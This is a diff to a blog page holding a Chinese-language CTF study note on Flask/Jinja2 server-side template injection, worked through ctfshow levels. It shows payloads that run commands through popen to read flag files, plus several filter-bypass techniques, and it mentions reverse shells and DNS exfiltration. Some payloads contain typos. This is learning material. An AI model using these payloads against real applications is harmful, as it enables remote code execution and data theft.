@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-03-23T07:58:07.000Z">
-<meta property="article:modified_time" content="2025-03-25T03:02:51.207Z">
+<meta property="article:modified_time" content="2025-03-27T10:50:43.019Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1742886474842),
+    lastupdate: new Date(1743073833444),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2732,6 +2732,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 <p>这是一些加载os模块的一些方法</p>
+<p>os._wrap_close</p>
 <h3 id="4-importlib类执行命令"><a href="#4-importlib类执行命令" class="headerlink" title="4.importlib类执行命令"></a>4.importlib类执行命令</h3>
 
 <p>我么也可以通过找到importlib这个子类去加载os模块</p>
@@ -2775,6 +2776,87 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
+
+<h3 id="362关"><a href="#362关" class="headerlink" title="362关"></a>362关</h3><p>这个题目和之前差不多，但是我们在执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">2</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>的时候没回显，3的时候也是，也就是过滤掉了2和3，</p>
+<p>但是我们使用文件读取脚本还是查到了模块我们可以直接文件读取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">94</span>][<span class="string">&#x27;get_data&#x27;</span>](<span class="number">0</span>,<span class="string">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是重点还是在命令执行 ，我们想通过os模块进行命令执行，我们先尝试查找</p>
+<h2 id="5-绕过方法"><a href="#5-绕过方法" class="headerlink" title="5.绕过方法"></a>5.绕过方法</h2><p>果然还是离不开过滤绕过</p>
+<h3 id="1-大括号过滤"><a href="#1-大括号过滤" class="headerlink" title="1.大括号过滤"></a>1.大括号过滤</h3><p>我们之前的payload都是基于<code>&#123;&#123;&#125;&#125;</code>进行注入的，但是这个被过滤了，我们只能选择<code>&#123;% %&#125;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125;是属于flask的控制语句，且以&#123;% end...%&#125;结尾，可以通过在控制语句定义变量或者写循环</span><br></pre></td></tr></table></figure>
+
+<p>我们无法像<code>&#123;&#123;&#125;&#125;</code>那样直接回显，但是我们可以利用函数print()去把执行结果打印出来，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="number">2</span>&gt;<span class="number">1</span> %&#125; <span class="number">37</span> &#123;% endif%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就会成功回显数字37，因此我们可以利用if语句去执行我们的SSTI注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>] %&#125;<span class="number">37</span> &#123;% endif%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过这个方式找到popen函数</p>
+<p>我们也可以直接调用os模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="2-过滤"><a href="#2-过滤" class="headerlink" title="2.[]过滤"></a>2.<code>[]</code>过滤</h3><p>当我们的<code>[]</code>被过滤掉的时候，我们就无法直接调用命令执行的函数[‘popen’]等一系列函数</p>
+<p>这时候我们就需要用到<code>__getitem__</code>魔术方法</p>
+<p><code>__getitem__</code> 是 Python 中的一个重要魔术方法，用于实现对象的索引访问功能。它允许你的自定义类实例像序列或映射一样使用 <code>[]</code> 运算符进行访问。</p>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">    <span class="comment"># 实现索引访问逻辑</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
+
+<p>当我们查询结果出来以后会发现其实每个模块和函数之间都是用的逗号隔开名字和函数内容之间使用<code>:</code>隔开，所以返回的就是python里面的字典，我们利用<code>__gettitem__</code>去打开函数，总之用到[]的地方用就行了</p>
+<p>我们构造一个payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">37</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /app/falg&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-引号过滤"><a href="#3-引号过滤" class="headerlink" title="3.引号过滤"></a>3.引号过滤</h3><p>引号使用来包裹函数和模块名字和代码的，引号被过滤了也就意味着没办法直接引用函数的名字和代码了</p>
+<p>我们当然还是有办法的，就是使用request获取我们的请求内容来实现函数名和代码的注入</p>
+<p>Flask 的 <code>request</code> 对象是处理客户端 HTTP 请求的核心工具，它封装了所有客户端发送的请求数据。</p>
+
+
+
+
+<p>我们需要的就是在用到需要引号的地方把函数名和代码用request的其他方法去传入然后再用request函数引用</p>
+<h3 id="4-过滤器绕过下划线过滤"><a href="#4-过滤器绕过下划线过滤" class="headerlink" title="4.过滤器绕过下划线过滤"></a>4.过滤器绕过下划线过滤</h3><p>SSTI学到现在，最烦的就是有好多下划线，关键是使用魔术方法必须用4个下划线，现在好了，过滤掉了，大家都别用了</p>
+<p>我们需要用到的就是过滤器，先看下常用的过滤器</p>
+
+
+<p>我们主要使用的是 attr()去获取属性比如<code>attr(__class__)</code> 然后去使用管道符去将对象属性去传入下一个atter()</p>
+<p>我们还是直接构造payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|atter(__class__)|atter(__base__)|atter(__subclasses__)()|atter(__getitem__)(<span class="number">117</span>)|atter(__init__)|atter(__globals__)|atter(__getitem__)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /app/flag&#x27;</span>)|atter(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br><span class="line"><span class="comment">#由于过滤掉了下滑线，我们得用requers.args. 用GET请求去传参</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>不知道为什么不能直接加[117]，得用<code>__getitem__</code></p>
+<p>我们发现了，这个payload也可以去绕过点号的过滤</p>
+<h3 id="5-中括号绕过点号的过滤"><a href="#5-中括号绕过点号的过滤" class="headerlink" title="5.中括号绕过点号的过滤"></a>5.中括号绕过点号的过滤</h3><p>说真的，之前其实不知道payload里面的点号是干什么用的，</p>
+<p>点号是用来访问外来属性的，难怪每个魔术方法之间都需要用点号隔开</p>
+<p>当点号被过滤掉的时候，我们也可以使用中括号<code>[]</code>去访问对象属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-无回显SSTI"><a href="#6-无回显SSTI" class="headerlink" title="6.无回显SSTI"></a>6.无回显SSTI</h2><h3 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h3><p>我们之前在命令执行里面学过反弹shell，就是通过把目标服务器的输入和输出重定向到我们的云服务器，然后进行攻击</p>
+<p>但大多数情况下，反弹shell都不可行，毕竟这个成了甚至可以黑掉一个服务器</p>
+<p>SSTI反弹shell和php差不多，都是先对端口进行监听，然后让目标服务器去访问云服务器下的那个监听端口</p>
+
+
+
+
+<h3 id="2-dnslog外带"><a href="#2-dnslog外带" class="headerlink" title="2.dnslog外带"></a>2.dnslog外带</h3><p>就是和命令执行dnslog外带一样，在查询结果后面加上dns域名，就可以实现dnslog外带</p>
+<p>但还是不知道为什么，还是和反弹shell一样很难成功</p>
+<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h3><p>这个和sql注入时的布尔盲注一样，通过ascii()和二分法将查询结果一个字符一个字符的推断出来</p>
+
+
   </div>
   
   
@@ -2798,10 +2880,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-25T11:02:51+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-27T18:50:43+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 25, 2025</p>
+    <p>更新于：Mar 27, 2025</p>
   </a>
 </div>
 
@@ -2877,6 +2959,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
+        <a class='prev' href='/2025/03/25/SSTI-flask-labs/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>SSTI-flask-labs</p>
+          <p class='content'>SSTI-labs笔记前言实在草率了，没想到SSTI有点难，那些模块，子类，函数实在太多了。根本没有什么做题思路，还是得从头开始，去了解一些做题思路
+1关 调用os模块首先是一个输入框，我们不可...</p>
+        </a>
+      
       
         <a class='next' href='/2025/03/18/BaseCTF/'>
           <p class='title'>BaseCTF<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
@@ -2940,7 +3028,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">2.漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">3.常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">1.文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">2.内建函数eval命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">3.os模块执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">4.importlib类执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">5.linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">6.subprocess.Popen类执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ctfshow"><span class="toc-text">4.ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#361%E5%85%B3"><span class="toc-text">361关</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">2.漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">3.常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">1.文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">2.内建函数eval命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">3.os模块执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">4.importlib类执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">5.linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">6.subprocess.Popen类执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ctfshow"><span class="toc-text">4.ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#361%E5%85%B3"><span class="toc-text">361关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#362%E5%85%B3"><span class="toc-text">362关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">5.绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">1.大括号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4"><span class="toc-text">2.[]过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">3.引号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">4.过滤器绕过下划线过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%82%B9%E5%8F%B7%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-text">5.中括号绕过点号的过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="toc-text">6.无回显SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-dnslog%E5%A4%96%E5%B8%A6"><span class="toc-text">2.dnslog外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.布尔盲注</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3510,7 +3598,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/23/SSTI/","name":"SSTI"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SSTI","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/23/SSTI/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/23/SSTI/","wordCount":0,"datePublished":"2025-03-23T07:58:07.000Z","dateModified":"2025-03-25T03:02:51.207Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/23/SSTI/","name":"SSTI"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SSTI","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/23/SSTI/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/23/SSTI/","wordCount":0,"datePublished":"2025-03-23T07:58:07.000Z","dateModified":"2025-03-27T10:50:43.019Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
